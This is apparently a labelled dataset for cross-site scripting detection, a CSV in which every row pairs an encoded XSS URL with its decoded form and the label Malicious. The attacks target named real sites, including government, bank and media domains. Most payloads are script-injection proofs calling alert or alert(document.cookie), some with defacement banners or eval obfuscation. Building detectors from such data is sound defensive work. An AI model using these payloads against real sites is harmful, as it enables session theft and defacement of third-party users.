Payloads,Class,decoded,executed,parser_changed
http://svs.gsfc.nasa.gov/cgi-bin/advsearch.cgi?query=&lt;script&gt;alert(&quot;effektz&quot;)&lt;/script&gt;&amp;req=search,Malicious,"http://svs.gsfc.nasa.gov/cgi-bin/advsearch.cgi?query=<script>alert(""effektz"")</script>&req=search",True,True
http://comic.naver.com/webtoon/detail.nhn?titleid=22045&amp;no=227&amp;weekday=%22%3e%3cscript%3ealert%28doc<br>ument.cookie%29%3c/script%3e,Malicious,"http://comic.naver.com/webtoon/detail.nhn?titleid=22045&no=227&weekday=""><script>alert(document.cookie)</script>",True,True
http://www.saglikcaylari.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.saglikcaylari.com/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
http://www.asiamedia.ucla.edu/article-world.asp?parentid=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;turkhac<br>keriz.com&lt;/h1&gt;,Malicious,"http://www.asiamedia.ucla.edu/article-world.asp?parentid=""><script>alert('trex')</script><h1>turkhackeriz.com</h1>",True,True
http://www.marathon.com/search/?search2=&quot;&gt;&lt;script&gt;alert('big oil is bad');&lt;/script&gt;,Malicious,"http://www.marathon.com/search/?search2=""><script>alert('big oil is bad');</script>",True,True
http://www.cne.gov.co/cne/index.jsp?option=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.cne.gov.co/cne/index.jsp?option=""><script>alert(document.cookie)</script>",True,True
http://www1.caixa.gov.br/busca/asp/resultado_busca.asp?q1=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious,http://www1.caixa.gov.br/busca/asp/resultado_busca.asp?q1=<script>alert(/xss/);</script>,True,True
http://benq.co.uk/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://benq.co.uk/press/news.cfm?id=1882&cat=2&year=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.edusoftlearning.com/popups/showpic.asp?src=%22%3e%3cscript%3ealert(666)%3c/script%3e,Malicious,"http://www.edusoftlearning.com/popups/showpic.asp?src=""><script>alert(666)</script>",True,True
https://fort.forsythe.com/forsythesso/login.jsp?site2pstoretoken=%22);%3c/script%3e%3cscript%3ealert<br>(%27xss%27);%3c/script%3e,Malicious,"https://fort.forsythe.com/forsythesso/login.jsp?site2pstoretoken="");</script><script>alert('xss');</script>",True,True
http://my.opera.com/community/photos/search?q=1&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious,"http://my.opera.com/community/photos/search?q=1""><script>alert('xss')</script>",True,True
http://book.qantas.com.au/pl/qfservicing/wds/flifoinfoservlet?site=qfqfqfsd&amp;language=gb&amp;b_date=20201<br>1291425&amp;b_location=syd&amp;e_location=adl&amp;airline_code=qf&amp;flight_number=759&amp;equipment=bo%22/%3e%3cbody%2<br>0onload=%22alert%281%29%22%3e%3cscript%3ealert%281%29;%3c/script%3e%3cinput%3exxx?eing%20767-300/300<br>er&amp;equipment_code=76%22/%3e%3cinput%3e%3e%3cbody%20onload=%22alert%281%29%22%3e%3cscript%3ealert%281<br>%29;%3c/script%3exx3&amp;duration=0%22/%3e%3cinput%3exx,Malicious,"http://book.qantas.com.au/pl/qfservicing/wds/flifoinfoservlet?site=qfqfqfsd&language=gb&b_date=202011291425&b_location=syd&e_location=adl&airline_code=qf&flight_number=759&equipment=bo""/><body onload=""alert(1)""><script>alert(1);</script><input>xxx?eing 767-300/300er&equipment_code=76""/><input>><body onload=""alert(1)""><script>alert(1);</script>xx3&duration=0""/><input>xx",True,True
http://24.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://24.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.agencedudauphin.com/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.agencedudauphin.com/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://www.zibidi.com/tr/yazdir.asp?x=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.zibidi.com/tr/yazdir.asp?x=""><script>alert(""maxwel"")</script>",True,True
http://www.mobiloyunlar.com/oyun_detay.php?oyun_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.mobiloyunlar.com/oyun_detay.php?oyun_id=""><script>alert(document.cookie)</script>",True,True
http://groups.im/u/login_show.do?jurl=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://groups.im/u/login_show.do?jurl=""><script>alert(document.cookie)</script>",True,True
http://www.alisverisebasla.com/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.alisverisebasla.com/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://www.123greetings.com/cgi-bin/search/search.pl?words=%22%3e%3cscript%3ealert(%22happy%20hallow<br>een%22)%3c/script%3e&amp;fpage=halloween&amp;i1.x=0&amp;i1.y=0,Malicious,"http://www.123greetings.com/cgi-bin/search/search.pl?words=""><script>alert(""happy halloween"")</script>&fpage=halloween&i1.x=0&i1.y=0",True,True
http://www.inquireaboutthisdomain.com/?domainname=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://www.inquireaboutthisdomain.com/?domainname=""><script>alert(1)</script>",True,True
http://www.udg.mx/directoriowebs/contalink.php/%3e%22%3e%3cscript%3ealert('norehem')%3c/script%3e.,Malicious,"http://www.udg.mx/directoriowebs/contalink.php/>""><script>alert('norehem')</script>.",True,True
http://tbroc.tbroc.gov.tw/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious,"http://tbroc.tbroc.gov.tw/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]=""><script>alert(document.cookie)</script></script>",True,True
http://www.politicheagricole.gov.it/motorericerca/risultati?txtquery1=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e&amp;submit=cerca%26<br>aaaa=byxados,Malicious,"http://www.politicheagricole.gov.it/motorericerca/risultati?txtquery1=""><script>alert(document.cookie)</script><marquee><h1>xss by xados<h1></marquee>&submit=cerca&aaaa=byxados",True,True
https://auth.dhs.gov/oam/hsinlogin/?authn_try_count=0&contexttype=external&username=string&ssocookie:max-age=3600&contextvalue=%2foam&password=sercure_string&challenge_url=%2fhsinlogin&ssocookie=max-age%3d3600&request_id=%27%22--%3e%3cmarquee%3e%3ccenter%3e%3c%2fimg%3e%3cbr%3e+%3cbr%3e%3cscript%3ealert%28document.cookie%29;%3c/script%3e,Malicious,"https://auth.dhs.gov/oam/hsinlogin/?authn_try_count=0&contexttype=external&username=string&ssocookie:max-age=3600&contextvalue=/oam&password=sercure_string&challenge_url=/hsinlogin&ssocookie=max-age=3600&request_id='""--><marquee><center></img><br> <br><script>alert(document.cookie);</script>",True,True
http://www.ekolay.net/dekorasyon/mesajpano/mesajyaz.asp?cat=%22%3e%3cscript%3ealert(&quot;hehe&quot;)%3c/scrip<br>t%3e,Malicious,"http://www.ekolay.net/dekorasyon/mesajpano/mesajyaz.asp?cat=""><script>alert(""hehe"")</script>",True,True
http://search.hondacars.com/default.asp?ui_mode=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e&amp;question_box=yo,Malicious,"http://search.hondacars.com/default.asp?ui_mode=""><script>alert(document.cookie)</script>&question_box=yo",True,True
http://www.evrensel.net/spor.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.evrensel.net/spor.php?txt_arsiv_tarihi=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
https://outdoorplanner.arubanetworks.com/index.cfm?fuseaction=login.forgotpassword&amp;email=%3cscript%3<br>ealert%28document.cookie%29%3c/script%3e,Malicious,https://outdoorplanner.arubanetworks.com/index.cfm?fuseaction=login.forgotpassword&email=<script>alert(document.cookie)</script>,True,True
http://www.coe.gouv.fr/spip.php?action=cookie&amp;url=java:%22/%3e%3cscript%3ealert('hello%20the%20rat')<br>%3c/script%3e,Malicious,"http://www.coe.gouv.fr/spip.php?action=cookie&url=java:""/><script>alert('hello the rat')</script>",True,True
http://uk.shopping.com/xfs?kw=%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;clt=sch,Malicious,"http://uk.shopping.com/xfs?kw=""><script>alert(123)</script>&clt=sch",True,True
http://www.odfalliance.org/members.php?id=2%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.odfalliance.org/members.php?id=2""><script>alert(document.cookie)</script>",True,True
http://www.techdirt.com/blog.php?tag=app+store&amp;site=wireless%27%22%3e%3c/title%3e%3cscript%3ealert(1<br>337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.techdirt.com/blog.php?tag=app store&site=wireless'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.chriswaltersracing.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.chriswaltersracing.com/igallery34/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.jonessoda.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.jonessoda.com/guestbook/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
<script for=document event=onreadystatechange>javascript:alert(1)</script>,Malicious,<script for=document event=onreadystatechange>javascript:alert(1)</script>,True,True
http://tabir.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://tabir.net/directory.php?cat=""><script>alert(document.cookie)</script>",True,True
http://www.thegreenboard.com/forum/search.php?cat=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.thegreenboard.com/forum/search.php?cat=""><script>alert(""maxwel"")</script>",True,True
http://www.iie.org/fulbrighttemplate.cfm?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.iie.org/fulbrighttemplate.cfm?section=""><script>alert(""maxwel"")</script>",True,True
http://tdglobal.ksc.nasa.gov/servlet/search?field1=s%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3em_text&amp;text1=%27%22%3e%3c%<br>2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c<br>%2fmarquee%3e&amp;join1to2=and&amp;field2=sm_text&amp;text2=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2f<br>script%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;join2to3=and&amp;field3=sm_te<br>xt&amp;text3=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by<br>+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;max_results=100&amp;layup=standard,Malicious,"http://tdglobal.ksc.nasa.gov/servlet/search?field1=s'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>m_text&text1='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&join1to2=and&field2=sm_text&text2='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&join2to3=and&field3=sm_text&text3='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&max_results=100&layup=standard",True,True
http://www.troubledstreets.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.troubledstreets.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://www.rhinotalk.net/forums/member-introductions/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,Malicious,"http://www.rhinotalk.net/forums/member-introductions/?threadprefix=""></a><script>alert(document.cookie);</script>",True,True
http://www.platformdergisi.net/yazar/detail.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;,Malicious,"http://www.platformdergisi.net/yazar/detail.php?id=""><script>alert(document.cookie)</script>>",True,True
https://www2.dpf.gov.br/gru/gru?nac=1%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"https://www2.dpf.gov.br/gru/gru?nac=1""><script>alert(document.cookie)</script>",True,True
http://www.globalcomputing.com/getschools_letter1.cfm?letter=m}%3c/style%3e%3cscript%3ea=eval;b=aler<br>t;a(b(/xss/.source));%3c/script%3e,Malicious,http://www.globalcomputing.com/getschools_letter1.cfm?letter=m}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.data-archive.ac.uk/search/searchukda.asp?q1=thesaurus}%3c/style%3e%3cscript%3ea=eval;b=al<br>ert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/mar<br>quee%3e}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3<br>e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.data-archive.ac.uk/search/searchukda.asp?q1=thesaurus}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://fr.myweb2.search.yahoo.com/yhs/search?fr=yhs-ipnmrtl&amp;ei=utf-8&amp;lyt=st&amp;p=&quot;&gt;&lt;script&gt;alert(docume<br>nt.cookie)&lt;/script&gt;,Malicious,"http://fr.myweb2.search.yahoo.com/yhs/search?fr=yhs-ipnmrtl&ei=utf-8&lyt=st&p=""><script>alert(document.cookie)</script>",True,True
http://www.thecurrentonline.com/media/storage/paper304/news/2008/10/06/artsandentertainment/npr-radi<br>o.show.host.ira.glass.tells.true.tales.at.soldout.benefit.for.prison.per-3472517.shtml%22%3e%3cscrip<br>t%3ealert(document.cookie)%3c/script%3e%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.thecurrentonline.com/media/storage/paper304/news/2008/10/06/artsandentertainment/npr-radio.show.host.ira.glass.tells.true.tales.at.soldout.benefit.for.prison.per-3472517.shtml""><script>alert(document.cookie)</script>""><script>alert(document.cookie)</script>",True,True
http://www.mrenlinea.com/aspr/contact.asp?to=desdibujos@yahoo.com}%3c/style%3e%3cscript%3ea=eval;b=a<br>lert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/ma<br>rquee%3e,Malicious,"http://www.mrenlinea.com/aspr/contact.asp?to=desdibujos@yahoo.com}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://jan.brelih.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://jan.brelih.com/gallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://uk.singerspro.com/search_all.php?uid=&amp;name=&amp;keyword='&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,Malicious,http://uk.singerspro.com/search_all.php?uid=&name=&keyword='><script>alert(document.cookie);</script>,True,True
http://www.hostingplan.net/phpinfo.php?a[]=&gt;&lt;script&gt;alert('kabus-kabustr.com');&lt;/script&gt;,Malicious,http://www.hostingplan.net/phpinfo.php?a[]=><script>alert('kabus-kabustr.com');</script>,True,True
http://www.scriptin.net/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious,http://www.scriptin.net/signinform.php?msg=<script>alert(/xssed/)</script>,True,True
http://www.excite.es/search/news/results?q=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.excite.es/search/news/results?q=""><script>alert(""maxwel"")</script>",True,True
http://oroscopo.seidimoda.repubblica.it/zodiaco.php?segno=%22%3e%3cmarquee%3e%3cscript%3ealert%28doc<br>ument.cookie%29%3c/script%3e%3c/marquee%3e,Malicious,"http://oroscopo.seidimoda.repubblica.it/zodiaco.php?segno=""><marquee><script>alert(document.cookie)</script></marquee>",True,True
http://www.jmhuberinstitute.org/detail.asp?id=&lt;script&gt;alert('drakula')&lt;/script&gt;,Malicious,http://www.jmhuberinstitute.org/detail.asp?id=<script>alert('drakula')</script>,True,True
http://www.exstart.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.exstart.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.journaux.fr/revue.php?id=95267%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%6<br>1%6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e<br>%58%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e,Malicious,"http://www.journaux.fr/revue.php?id=95267'""></title><script>alert(1337)</script>><marquee><h1>XSS by XYLITOL</h1></marquee>",True,True
http://webinfo.parl.gc.ca/membersofparliament/quicksearch.aspx?searchterm=%3cscript%3ealert%28%22mod<br>akabam%22%29%3c/script%3e,Malicious,"http://webinfo.parl.gc.ca/membersofparliament/quicksearch.aspx?searchterm=<script>alert(""modakabam"")</script>",True,True
http://www.hrol.cn/xxkd/show.php?id=%27%27%27%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious,http://www.hrol.cn/xxkd/show.php?id='''></title><script>alert(1337)</script>,True,True
http://www.3000mb.com/cgi-bin/xpanel/confirm.cgi?id=&quot;&gt;&lt;script&gt;alert(&quot;starext&quot;)&lt;/script&gt;,Malicious,"http://www.3000mb.com/cgi-bin/xpanel/confirm.cgi?id=""><script>alert(""starext"")</script>",True,True
http://ms142.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms142.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://blu-rayunlimited.com/bluray.php?id=9447&amp;page=reviews/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://blu-rayunlimited.com/bluray.php?id=9447&page=reviews/""><script>alert(1)</script>",True,True
http://www.duvida.net/sinonimos/index.php?add=%22%3e%3cscript%3ealert(666)%3c/script%3e&amp;lang=br,Malicious,"http://www.duvida.net/sinonimos/index.php?add=""><script>alert(666)</script>&lang=br",True,True
http://poliperlis.edu.my/igallery33/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://poliperlis.edu.my/igallery33/folderview.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
"http://www.saab.com.au/servlet/saabmail?attch1=111-222-1933email@address.tst&template=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious,"http://www.saab.com.au/servlet/saabmail?attch1=111-222-1933email@address.tst&template=>""><script 
>alert(/xss by turkpower/);</script><h1>xss by turkpower</h1></marquee>",True,True
https://ssl-account.com/adt-bs.de/check_login.php?lang=en&amp;err_string=%3c/font%3e%3ciframe%20src=java<br>script:alert(123)%3e%3c/iframe%3e,Malicious,https://ssl-account.com/adt-bs.de/check_login.php?lang=en&err_string=</font><iframe src=javascript:alert(123)></iframe>,True,True
http://www.yourwaysurf.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.yourwaysurf.com/signup.php?ref=""></a><script>alert(1);</script>",True,True
http://stats.oecd.org/glossary/alpha.asp?let=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://stats.oecd.org/glossary/alpha.asp?let=</textarea>'""><script>alert(document.cookie)</script>",True,True
http://tv.msn.co.kr/enter/mvholic/info/image_view.html?_movieid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://tv.msn.co.kr/enter/mvholic/info/image_view.html?_movieid=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://services.sea.lau.edu.lb/login/validate.asp?baseframe=1%3e%22%3e%3cscript%20%0a%0d%3ealert%28%<br>27f0rtys3v3n%27%29%3b%3c/script%3e,Malicious,"http://services.sea.lau.edu.lb/login/validate.asp?baseframe=1>""><script 
>alert('f0rtys3v3n');</script>",True,True
http://www.as-roma.ru/showtext.php?mode=trofei&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://www.as-roma.ru/showtext.php?mode=trofei<script>alert(document.cookie)</script>,True,True
http://www.oyababygift.com/news.php?newsid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.oyababygift.com/news.php?newsid=""><script>alert(document.cookie)</script>",True,True
http://www.novonordisk.gr/search.asp?query=%cf%83%cf%84%ce%b7%ce%bd&amp;st=11&amp;rq=0&amp;col=affil&amp;charset=utf<br>-8&amp;qp=site:novonordisk.gr&amp;ql_col_switch=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27<br>%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.novonordisk.gr/search.asp?query=στην&st=11&rq=0&col=affil&charset=utf-8&qp=site:novonordisk.gr&ql_col_switch='""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.romanarmy.nl/rat/cal_lite.php?id=12&amp;mode=display&amp;cl_d=%3cscript%3ealert(document.cookie)%<br>3c/script%3e&amp;cl_m=11&amp;cl_y=2008,Malicious,http://www.romanarmy.nl/rat/cal_lite.php?id=12&mode=display&cl_d=<script>alert(document.cookie)</script>&cl_m=11&cl_y=2008,True,True
http://www.reisebank.de/index.php?id=38&amp;search_type=1&amp;location=%22%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious,"http://www.reisebank.de/index.php?id=38&search_type=1&location=""<script>alert(document.cookie)</script>",True,True
http://www.axn-asia.com/search/node/'%22--%3e%3cscript%3ealert(/w0ot/)%3c/script%3e,Malicious,"http://www.axn-asia.com/search/node/'""--><script>alert(/w0ot/)</script>",True,True
http://iclanarkshire.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.<br>org/)%3c/script%3e%3cp,Malicious,"http://iclanarkshire.icnetwork.co.uk/search.cfm?query=""><script>alert(/xss - thedefaced.org/)</script><p",True,True
http://wasc.ir/tomcat-docs/appdev/sample/web/hello.jsp/1%3cscript%3ealert%28123%29%3c/script%3e,Malicious,http://wasc.ir/tomcat-docs/appdev/sample/web/hello.jsp/1<script>alert(123)</script>,True,True
http://www.answers.com/main/ntquery?s=%22%3e%3cscript%3ealert%28%27found+by+guru+of+hg%27%29%3c%2fsc<br>ript%3e&amp;gwp=13,Malicious,"http://www.answers.com/main/ntquery?s=""><script>alert('found by guru of hg')</script>&gwp=13",True,True
http://prints.deviantart.com/?section=shop&amp;qh=boost%3apopular&amp;q=%22%3e%3cscript%3ealert%281%29%3c%2f<br>script%3e,Malicious,"http://prints.deviantart.com/?section=shop&qh=boost:popular&q=""><script>alert(1)</script>",True,True
http://sante.canoe.com/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(%22by%20encor<br>e%20!%22)%3c/script%3e,Malicious,"http://sante.canoe.com/browse_alphabetically.asp?search_letter=""><script>alert(""by encore !"")</script>",True,True
http://gallery.azlink.info/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://gallery.azlink.info/gallery/folderview.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.culture-buzz.cn/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20rat'<br>)%3c/script%3e,Malicious,"http://www.culture-buzz.cn/spip.php?action=cookie&url=java:""/<script>alert('hello the rat')</script>",True,True
http://www.gazeteodtulu.com/yazilar.php?id=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c<br>/script%3e,Malicious,"http://www.gazeteodtulu.com/yazilar.php?id=3e""><script 
>alert(document.cookie);</script>",True,True
http://sonica.speedy.com.ar/resultado_busqueda.php?tipo=1&texto=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e,Malicious,"http://sonica.speedy.com.ar/resultado_busqueda.php?tipo=1&texto=""><script>alert(/xss/)</script>",True,True
http://lingua.ubbcluj.ro/index.php?menuid=2&amp;lang=%22%3e%3cscript%3ealert(/[]0izy5/)%3c/script%3e,Malicious,"http://lingua.ubbcluj.ro/index.php?menuid=2&lang=""><script>alert(/[]0izy5/)</script>",True,True
http://taz.vv.sebank.se/cgi-bin/pts3/pos/sebse.asp?serverkey=primary&amp;collection=sebse&amp;resultstart=0&amp;<br>defaulttext=s%c3%b6k+p%c3%a5+seb.se&amp;lang=se&amp;querytext=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fsc<br>ript%3e%22,Malicious,"http://taz.vv.sebank.se/cgi-bin/pts3/pos/sebse.asp?serverkey=primary&collection=sebse&resultstart=0&defaulttext=sök på seb.se&lang=se&querytext="">'><script>alert(123)</script>""",True,True
